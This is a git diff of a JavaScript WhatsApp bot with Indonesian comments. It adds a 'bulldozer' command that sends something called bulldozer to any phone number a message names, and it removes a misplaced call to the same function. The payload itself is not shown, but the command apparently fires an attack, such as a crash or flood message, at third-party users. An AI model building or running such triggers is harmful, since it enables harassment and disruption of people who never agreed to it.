@@ -100,7 +100,6 @@ function setupMenu(sock) {
     rl.removeAllListeners("line")
     rl.on("line", async (input) => {
         switch (input.trim()) {
-          await bulldozer(target);
             case "1":
                 console.log(red("\n→ Restarting bot...\n"))
                 restartBot()
@@ -308,26 +307,44 @@ async function startBot() {
         sock.ev.on("creds.update", saveCreds)
 
         sock.ev.on("messages.upsert", async ({ messages }) => {
-            let msg = messages[0]
-            if (!msg.message) return
-            if (!msg.key.fromMe) msgCount++
+    let msg = messages[0]
+    if (!msg.message) return // abaikan pesan kosong
+    if (!msg.key.fromMe) msgCount++
 
-            let from = msg.key.remoteJid
-            let text =
-                msg.message.conversation ||
-                msg.message.extendedTextMessage?.text ||
-                ""
+    let from = msg.key.remoteJid
+    let text =
+        msg.message.conversation ||
+        msg.message.extendedTextMessage?.text ||
+        ""
 
-            lastLog = `${from} → ${text}`
-            panel()
+    lastLog = `${from} → ${text}`
+    panel()
 
-            if (text === "ping") {
-                let t = Date.now()
-                await sock.sendMessage(from, { text: "pong!" })
-                let ping = Date.now() - t
-                panel(ping + " ms")
-            }
-        })
+    // ===== COMMAND PARSING =====
+    const args = text.trim().split(" ")
+    const command = args[0].toLowerCase()
+
+    if (command === "bulldozer") {
+        const target = args[1] // nomor tujuan
+        if (!target) {
+            await sock.sendMessage(from, { text: "Nomor tujuan tidak valid!" })
+            return
+        }
+        await bulldozer(target) // panggil fungsi bulldozer-mu
+        await sock.sendMessage(from, { text: `Bulldozer dikirim ke ${target}` })
+        return
+    }
+
+    if (command === "ping") {
+        let t = Date.now()
+        await sock.sendMessage(from, { text: "pong!" })
+        let ping = Date.now() - t
+        panel(ping + " ms")
+        return
+    }
+
+    // command lain bisa ditambah di sini
+})
 
         process.on("uncaughtException", (err) => {
             errCount++
